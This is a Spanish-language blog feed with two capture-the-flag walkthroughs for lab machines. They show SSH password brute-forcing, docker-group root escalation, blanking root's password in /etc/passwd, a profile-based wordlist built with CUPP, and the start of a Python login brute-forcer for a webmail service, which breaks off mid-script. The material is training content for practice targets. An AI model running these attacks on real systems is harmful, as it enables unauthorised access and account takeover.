<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-09-09T09:55:03+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">CanYouHackMe?</title><link href="/posts/canyouhackme/" rel="alternate" type="text/html" title="CanYouHackMe?" /><published>2024-09-09T00:00:00+00:00</published><updated>2024-09-09T00:00:00+00:00</updated><id>/posts/canyouhackme</id><content type="html" xml:base="/posts/canyouhackme/"><![CDATA[<p><img src="/assets/images/canyou/canyou.jpg" alt="image" /></p>

<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por Enaitz de dificultad <strong>Principiante</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<h3 id="escaneo-de-red-local">Escaneo de red local</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> enp0s3 <span class="nt">--localnet</span>
10.0.2.169      08:00:27:24:af:8e       PCS Systemtechnik GmbH
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">arp-scan</code></strong>: Herramienta que escanea la red local usando el protocolo ARP (Address Resolution Protocol).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-I enp0s3</code></strong>: Especifica la interfaz de red a utilizar (en este caso <code class="language-plaintext highlighter-rouge">enp0s3</code>).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-localnet</code></strong>: Indica que se escaneará toda la red local.</li>
</ul>

<p>Obtenemos la dirección IP <code class="language-plaintext highlighter-rouge">10.0.2.169</code> y la dirección MAC de la máquina victima.</p>

<h3 id="escaneo-de-puertos-con-nmap">Escaneo de puertos con Nmap</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T</span> 4 10.0.2.169
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">nmap</code></strong>: Herramienta de escaneo de redes que detecta hosts, servicios y puertos abiertos.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-sS</code></strong>: Realiza un escaneo “SYN” o escaneo furtivo. Detecta puertos abiertos sin establecer una conexión completa, lo que lo hace más rápido y menos detectado.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-p-</code></strong>: Escanea todos los puertos TCP (del 1 al 65535).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-Pn</code></strong>: Omite el escaneo de ping, asume que el host está activo.</li>
  <li><code class="language-plaintext highlighter-rouge">-n</code>: Evita la resolución de DNS para acelerar el escaneo.</li>
  <li><code class="language-plaintext highlighter-rouge">-v</code>: Modo detallado (verbose), muestra más información durante el escaneo.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-T 4</code></strong>: Ajusta la velocidad del escaneo, en este caso a una velocidad agresiva (T4).</li>
</ul>

<p>Se descubren dos puertos abiertos: 22 (SSH) y 80 (HTTP).</p>

<h3 id="escaneo-detallado-de-versiones-de-servicios">Escaneo detallado de versiones de servicios</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.169
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 a8da3d7dc8cdc769ceed13fadeb99650 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0324b9cc0bc21509db739bb524d541ca <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://canyouhackme.thl
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">-sCV</code></strong>: Realiza un escaneo de servicios (<code class="language-plaintext highlighter-rouge">sV</code>) para obtener la versión del software, y ejecuta scripts de detección estándar (<code class="language-plaintext highlighter-rouge">sC</code>).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-p22,80</code></strong>: Escanea únicamente los puertos 22 (SSH) y 80 (HTTP).</li>
</ul>

<p>Se identifican las versiones de los servicios:</p>

<ul>
  <li><strong>OpenSSH 9.6p1</strong> (SSH).</li>
  <li><strong>Apache 2.4.58</strong> (HTTP), con un redireccionamiento a <code class="language-plaintext highlighter-rouge">http://canyouhackme.thl</code>.</li>
</ul>

<h3 id="modificación-del-archivo-etchosts">Modificación del archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.0.2.169 canyouhackme.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.0.2.169 canyouhackme.thl
</code></pre></div></div>

<ul>
  <li><strong>/etc/hosts</strong>: Archivo que mapea direcciones IP a nombres de dominio locales.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">echo</code></strong>: Imprime la cadena ‘10.0.2.169 canyouhackme.thl’.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">sudo tee -a /etc/hosts</code></strong>: Añade (<code class="language-plaintext highlighter-rouge">-a</code>) la salida del comando <code class="language-plaintext highlighter-rouge">echo</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Esto mapea el dominio <code class="language-plaintext highlighter-rouge">canyouhackme.thl</code> a la IP <code class="language-plaintext highlighter-rouge">10.0.2.169</code>, permitiendo acceder al sitio web localmente usando el nombre de dominio.</li>
</ul>

<h3 id="interacción-con-el-servidor-web">Interacción con el servidor web</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://canyouhackme.thl
/<span class="k">*</span> Hola juan, te he dejado un correo importate, cundo puedas, leelo <span class="k">*</span>/
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">curl</code></strong>: Herramienta que realiza peticiones HTTP desde la línea de comandos.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">http://canyouhackme.thl</code></strong>: Hace una petición HTTP al servidor web en <code class="language-plaintext highlighter-rouge">10.0.2.169</code> utilizando el nombre de dominio configurado en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<p>Obtenemos en el código fuente un comentario que menciona a un usuario llamado “juan” y que tiene un correo importante.</p>

<h1 id="intrusión">Intrusión</h1>

<h3 id="ataque-de-fuerza-bruta-con-patator">Ataque de fuerza bruta con <code class="language-plaintext highlighter-rouge">patator</code></h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login <span class="nv">host</span><span class="o">=</span>10.0.2.169 <span class="nv">user</span><span class="o">=</span>juan <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>~/rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Authentication failed.'</span> <span class="nt">-x</span> ignore:size<span class="o">=</span>53
22:26:03 patator    INFO - 0     40     0.105 | matrix                             |   610 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">patator</code></strong>: Herramienta para realizar ataques de fuerza bruta sobre diferentes protocolos. En este caso, se usa para probar múltiples contraseñas contra el servicio SSH.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">ssh_login</code></strong>: Módulo de <code class="language-plaintext highlighter-rouge">patator</code> para atacar el servicio SSH.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">host=10.0.2.169</code></strong>: Especifica el host objetivo.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">user=juan</code></strong>: Define el nombre de usuario (<code class="language-plaintext highlighter-rouge">juan</code>) para intentar iniciar sesión.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">password=FILE0</code></strong>: Indica que las contraseñas se tomarán de un archivo. El archivo se define con <code class="language-plaintext highlighter-rouge">0=~/rockyou.txt</code>, que es un diccionario común de contraseñas.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">x ignore:mesg='Authentication failed.'</code></strong>: Ignora los intentos fallidos que devuelven este mensaje.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">x ignore:size=53</code></strong>: Ignora respuestas de cierto tamaño que coincidan con intentos fallidos.</li>
</ul>

<p>Obtenemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">juan</code>.</p>

<h3 id="acceso-ssh-al-servidor">Acceso SSH al servidor</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh juan@10.0.2.169
juan@10.0.2.169<span class="s1">'s password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-41-generic x86_64)
Last login: Sat Sep  7 19:26:39 2024 from 192.168.1.142
User flag: 440**********
juan@TheHackersLabs-CanYouHackMe:~$
</span></code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">ssh</code></strong>: Comando para iniciar una sesión SSH (Secure Shell) en un servidor remoto.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">juan@10.0.2.169</code></strong>: Especifica el usuario (<code class="language-plaintext highlighter-rouge">juan</code>) y el servidor (<code class="language-plaintext highlighter-rouge">10.0.2.169</code>) al que te estás conectando.</li>
</ul>

<p>Se inicia sesión en la máquina como el usuario <code class="language-plaintext highlighter-rouge">juan</code> y se recibe el “User flag”, un código que confirma que se ha logrado acceso como usuario no privilegiado.</p>

<h3 id="verificación-de-permisos-del-usuario">Verificación de permisos del usuario</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,1002<span class="o">(</span>docker<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">id</code></strong>: Muestra la identidad y los grupos a los que pertenece el usuario actual.</li>
</ul>

<p>Se confirma que el usuario <code class="language-plaintext highlighter-rouge">juan</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">docker</code>, lo que sugiere una posible vía de escalada de privilegios.</p>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<h3 id="escalada-de-privilegios-utilizando-docker">Escalada de privilegios utilizando Docker</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt bash
Root flag: 233f3<span class="k">**************</span>
root@6f066383d815:/#
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">docker run</code></strong>: Ejecuta un contenedor Docker.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-v /:/mnt</code></strong>: Monta el sistema de archivos raíz (<code class="language-plaintext highlighter-rouge">/</code>) del host en el contenedor bajo el directorio <code class="language-plaintext highlighter-rouge">/mnt</code>. Esto da acceso completo al sistema de archivos del host.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">—rm</code></strong>: Elimina el contenedor cuando termine de ejecutarse.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-it</code></strong>: Abre una sesión interactiva (terminal) en el contenedor.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">alpine</code></strong>: Imagen ligera de Linux (Alpine Linux) que se usará para ejecutar el contenedor.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">chroot /mnt bash</code></strong>: Cambia el directorio raíz del contenedor a <code class="language-plaintext highlighter-rouge">/mnt</code> (el sistema de archivos del host), y abre una shell Bash con acceso completo al sistema de archivos del host.</li>
</ul>

<p>Se obtiene acceso como root en el sistema del host desde dentro del contenedor Docker, permitiendo visualizar el “Root flag”.</p>

<h3 id="modificación-del-archivo-etcpasswd">Modificación del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></h3>

<p>Ahora solo nos queda obtener acceso al host. Nos movemos al directorio <code class="language-plaintext highlighter-rouge">/mnt</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi ./etc/passwd
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">vi</code></strong>: Editor de texto en terminal que se usa para editar archivos.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">/etc/passwd</code></strong>: Archivo que almacena información sobre los usuarios del sistema. Cada línea representa un usuario.</li>
</ul>

<p>La línea para el usuario <code class="language-plaintext highlighter-rouge">root</code> normalmente tiene un campo de contraseña, pero se puede eliminar para permitir el acceso sin contraseña.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>Esta es la línea original para el usuario <code class="language-plaintext highlighter-rouge">root</code>. El campo <code class="language-plaintext highlighter-rouge">x</code> indica que la contraseña está almacenada de forma encriptada en el archivo <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root::0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>Se elimina el <code class="language-plaintext highlighter-rouge">x</code>, lo que indica que ahora el usuario <code class="language-plaintext highlighter-rouge">root</code> no tiene contraseña. Esto permitirá hacer <code class="language-plaintext highlighter-rouge">su</code> para cambiar al usuario <code class="language-plaintext highlighter-rouge">root</code> sin necesidad de una contraseña.</p>

<h3 id="acceso-como-usuario-root">Acceso como usuario root</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mnt <span class="c"># exit</span>
juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span>su
root@TheHackersLabs-CanYouHackMe:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@TheHackersLabs-CanYouHackMe:~#
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">su</code></strong>: Comando para cambiar al usuario root. Dado que se eliminó la contraseña de root en el paso anterior, ahora se puede acceder como root sin necesidad de ingresar una contraseña.</li>
</ul>

<h1 id="conclusión"><strong>Conclusión</strong></h1>

<p>Este CTF pone en práctica múltiples técnicas de hacking:</p>

<ul>
  <li><strong>Reconocimiento</strong>: Escaneo de red y de puertos para identificar servicios vulnerables.</li>
  <li><strong>Explotación</strong>: Ataque de fuerza bruta para obtener credenciales de usuario.</li>
  <li><strong>Escalada de privilegios</strong>: Uso del grupo <code class="language-plaintext highlighter-rouge">docker</code> para obtener acceso completo a la máquina mediante contenedores Docker.</li>
</ul>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">PhisermansPhriends</title><link href="/posts/PhisermansPhriends/" rel="alternate" type="text/html" title="PhisermansPhriends" /><published>2024-09-03T00:00:00+00:00</published><updated>2024-09-03T00:00:00+00:00</updated><id>/posts/PhisermansPhriends</id><content type="html" xml:base="/posts/PhisermansPhriends/"><![CDATA[<p><img src="/assets/images/phisermans/0.jpg" alt="image" /></p>

<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por mi de dificultad <strong>Profesional</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Empiezamos buscando la dirección IP del servidor en la red local:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
10.0.2.15      08:00:27:64:b7:09       <span class="o">(</span>Unknown<span class="o">)</span>
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <strong>10.0.2.15.</strong></p>

<p>Ahora vamos a realizar un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <strong>10.0.2.15:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.15
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
</code></pre></div></div>

<p>Vemos que tiene los puertos <strong>22 y 80</strong> abiertos y el <strong>443</strong> <strong>cerrado</strong>. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.15
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 33:e6:06:ab:20:8a:bc:9a:ce:c8:75:0f:aa:64:14:62 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 65:1d:29:46:6e:f2:fe:0d:b8:0e:63:8c:0d:f5:a1:cc <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.61
|_http-server-header: Apache/2.4.61 <span class="o">(</span>Debian<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://phisermansphriends.thl/
</code></pre></div></div>

<p>Vemos que el servidor web nos redirige a un dominio, lo agregamos al fichero <strong>/etc/hosts</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'10.0.2.15 phisermansphriends.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.0.2.15 phisermansphriends.thl
</code></pre></div></div>

<p>Vamos a ver que hay en esa web:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://phisermansphriends.thl
&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
  &lt;body&gt;
    &lt;p&gt;Estamos modificando la web. Contacto: mur.rusko@phisermansphriends.thl y admin@phisermansphriends.thl&lt;/&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>Vemos que hay 2 emails de contacto, los anotamos.</p>

<p>Ahora vamos a buscar subdominios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://10.0.2.15 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-H</span> <span class="s1">'Host: FUZZ.phisermansphriends.thl'</span> <span class="nt">-c</span> <span class="nt">-fw</span> 20
intranet                <span class="o">[</span>Status: 403, Size: 589, Words: 309, Lines: 6, Duration: 9ms]
mail                    <span class="o">[</span>Status: 200, Size: 5327, Words: 366, Lines: 97, Duration: 47ms]
</code></pre></div></div>

<p>Encontramos 2 subdominios, intranet (jenkins) y mail (roundcube), los añadimos al fichero <strong>hosts</strong>.</p>

<p>Como tenemos 2 emails vamos a buscar por las redes sociales a ver si encontramos algún usuario que pueda pertenecer a los usuarios encontrados. En instagram encontramos el perfil de <a href="https://www.instagram.com/mur.rusko/">mur.rusko</a>.  En el post que tiene publicado podemos leer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>🚀 ¡Hola a todos!

Me presento, soy **Mur Rusko** y hoy quiero compartir con ustedes una parte muy especial de mi vida. Nací el **20 de mayo de 1990**, y desde entonces he aprendido que la pasión por lo que haces es lo que realmente impulsa el éxito.

Es por eso que fundé **PhisermansPhriends**, una empresa que combina mi amor por la tecnología con mi compromiso de ofrecer soluciones innovadoras y de alta calidad. Nuestro objetivo es acompañar a nuestros clientes en cada paso de su camino hacia el éxito, brindando un servicio excepcional que va más allá de sus expectativas.

Además, me gustaría presentarles a un miembro muy importante de mi equipo, mi fiel compañero **Rufo** 🐾. Él nos recuerda cada día la importancia de la lealtad, la perseverancia y la energía positiva, valores que aplicamos en cada proyecto que emprendemos.

Estoy emocionado por lo que el futuro tiene reservado para **PhisermansPhriends** y estoy seguro de que juntos podemos lograr grandes cosas. 

Gracias a todos los que ya forman parte de este viaje y a los que se unirán pronto. ¡Vamos por más!

#emprendimiento #innovación #equipo #PhisermansPhriends #MurRusko #Rufo
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Vamos a gener un diccionario con los datos. Usaremos la herramienta <strong>CUPP.</strong></p>

<p>Clonamos CUPP:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Mebus/cupp.git
</code></pre></div></div>

<p>Lo ejecutamos y rellenamos los datos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python cupp.py <span class="nt">-i</span>
 ___________ 
   cupp.py!                 <span class="c"># Common</span>
      <span class="se">\ </span>                    <span class="c"># User</span>
       <span class="se">\ </span>  ,__,             <span class="c"># Passwords</span>
        <span class="se">\ </span> <span class="o">(</span>oo<span class="o">)</span>____         <span class="c"># Profiler</span>
           <span class="o">(</span>__<span class="o">)</span>    <span class="o">)</span><span class="se">\ </span>  
              <span class="o">||</span><span class="nt">--</span><span class="o">||</span> <span class="k">*</span>      <span class="o">[</span> Muris Kurgas | j0rgan@remote-exploit.org <span class="o">]</span>
                            <span class="o">[</span> Mebus | https://github.com/Mebus/]

<span class="o">[</span>+] Insert the information about the victim to make a dictionary
<span class="o">[</span>+] If you don<span class="s1">'t know all the info, just hit enter when asked! ;)

&gt; First Name: Mur
&gt; Surname: Rusko
&gt; Nickname: mur.rusko
&gt; Birthdate (DDMMYYYY): 20051990

&gt; Partners) name: 
&gt; Partners) nickname: 
&gt; Partners) birthdate (DDMMYYYY): 

&gt; Child'</span>s name: 
<span class="o">&gt;</span> Child<span class="s1">'s nickname: 
&gt; Child'</span>s birthdate <span class="o">(</span>DDMMYYYY<span class="o">)</span>: 

<span class="o">&gt;</span> Pet<span class="s1">'s name: Rufo
&gt; Company name: PhisermansPhriends

&gt; Do you want to add some key words about the victim? Y/[N]: 
&gt; Do you want to add special chars at the end of words? Y/[N]: 
&gt; Do you want to add some random numbers at the end of words? Y/[N]:
&gt; Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to mur.txt, counting 3252 words.
&gt; Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with mur.txt and shoot! Good luck!

</span></code></pre></div></div>

<p>Si nos fijamos en las peticiones al servicio de mail, vemos que tiene un token CSRF que va cambiando con cada petición. Necesitaremos un script que realice ese cambio de token para poder realizar el ataque de fuerza bruta.</p>

<p>Usamos el siguiente script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">from</span> <span class="n">multiprocessing.dummy</span> <span class="kn">import</span> <span class="n">Pool</span> <span class="k">as</span> <span class="n">ThreadPool</span>

<span class="n">settings</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">threads</span><span class="sh">"</span> <span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">username</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">mur.rusko@phisermansphriends.thl</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">url</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">http://mail.phisermansphriends.thl/</span><span class="sh">"</span>
<span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">Accept</span><span class="sh">'</span> <span class="p">:</span> <span class="sh">'</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><span class="sh">'</span>
<span class="p">}</span>

<span class="nf">if </span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">):</span>
    <span class="n">console_mode</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Command line mode</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--threads</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-t</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Number of Threads</span><span class="sh">'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
    <span class="nf">if </span><span class="p">(</span><span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">threads</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"'</span><span class="s">--threads</span><span class="sh">'</span><span class="s"> was omitted</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">settings</span><span class="p">[</span><span class="sh">"</span><span class="s">threads</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">threads</span>

<span class="k">def</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="sh">'</span><span class="s">request_token</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">(.*)</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">token</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">login</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">cookies</span>
